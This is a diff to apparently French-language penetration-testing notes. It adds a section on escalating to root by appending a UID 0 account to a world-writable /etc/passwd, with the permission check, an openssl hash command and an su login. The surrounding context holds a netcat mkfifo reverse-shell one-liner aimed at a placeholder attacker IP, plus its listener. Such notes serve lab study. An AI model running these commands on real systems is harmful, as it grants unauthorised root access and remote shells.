@@ -319,4 +319,37 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kali-ip> 4444 >/tmp
 nc -lnvp 4444
 ```
 
+### Abusing password authentication
 
+Si `/etc/passwd` est world-writable, on peut y ajouter un compte root arbitraire — le hash dans la deuxième colonne prend la priorité sur `/etc/shadow`.
+
+**Vérifier que /etc/passwd est writable**
+
+```bash
+ls -lah /etc/passwd
+```
+
+**Générer un hash de mot de passe**
+
+```bash
+openssl passwd w00t
+# → Fdzt.eqJQ4s0g
+```
+
+**Ajouter un superuser**
+
+```bash
+echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+UID/GID à 0 = compte root.
+
+**Se connecter avec le nouveau compte**
+
+```bash
+su root2
+id
+```
+
+
+## Insecure system components
